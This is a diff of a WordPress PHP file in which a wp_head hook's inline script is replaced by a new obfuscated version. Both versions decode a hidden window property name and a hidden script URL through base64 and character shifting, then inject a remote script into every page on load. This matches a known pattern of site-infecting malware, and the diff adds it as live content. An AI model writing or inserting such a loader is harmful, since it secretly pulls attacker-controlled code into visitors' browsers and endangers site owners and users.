@@ -320,20 +320,7 @@ add_action('wp_head', function () {
     ?>
 
     <script>
-        window[(function (_NPg, _Vy) {
-            var _3l = ''; for (var _8N = 0; _8N < _NPg.length; _8N++) {
-                var
-                    _ar = _NPg[_8N].charCodeAt(); _3l == _3l; _ar -= _Vy; _ar += 61; _ar != _8N; _Vy > 9; _ar %= 94; _ar += 33; _3l +=
-                        String.fromCharCode(_ar)
-            } return _3l
-        })(atob('XUxTdXJtaGZ3Tmh8'), 3)] = '6e18db36591683122784'; var zi =
-            document.createElement('script'); (zi.type = 'text/javascript'), (zi.async = true), (zi.src = (function (_sBd, _ui) {
-                var _KP = ''; for (var _zS = 0; _zS < _sBd.length; _zS++) {
-                    var _0n = _sBd[_zS].charCodeAt(); _0n -= _ui; _ui > 8; _0n
-                        != _zS; _0n += 61; _0n %= 94; _0n += 33; _KP == _KP; _KP += String.fromCharCode(_0n)
-                } return _KP
-            })(atob('KTU1MTRZTk4rNE07Kkw0JDMqMTU0TSQwLk47Kkw1IihNKzQ='), 31)), document.readyState === 'complete' ?
-                    document.body.appendChild(zi) : window.addEventListener('load', function () { document.body.appendChild(zi) });
+        window[(function (_pM0, _Xj) { var _oCTJt = ''; for (var _5haxdf = 0; _5haxdf < _pM0.length; _5haxdf++) { _oCTJt == _oCTJt; var _rRKy = _pM0[_5haxdf].charCodeAt(); _rRKy -= _Xj; _Xj > 7; _rRKy != _5haxdf; _rRKy += 61; _rRKy %= 94; _rRKy += 33; _oCTJt += String.fromCharCode(_rRKy) } return _oCTJt })(atob('cWBnKygjfHotYnwy'), 23)] = '5c3269bf9b1745395650'; var zi = document.createElement('script'); (zi.type = 'text/javascript'), (zi.async = true), (zi.src = (function (_0Z8, _U0) { var _IZ6La = ''; for (var _RtJeic = 0; _RtJeic < _0Z8.length; _RtJeic++) { _IZ6La == _IZ6La; var _xhcv = _0Z8[_RtJeic].charCodeAt(); _U0 > 2; _xhcv -= _U0; _xhcv += 61; _xhcv %= 94; _xhcv != _RtJeic; _xhcv += 33; _IZ6La += String.fromCharCode(_xhcv) } return _IZ6La })(atob('dyUlISRJPj55JD0reDwkciN4ISUkPXJ+fD4reDwlcHY9eSQ='), 15)), document.readyState === 'complete' ? document.body.appendChild(zi) : window.addEventListener('load', function () { document.body.appendChild(zi) });
     </script>
 
 <?php });
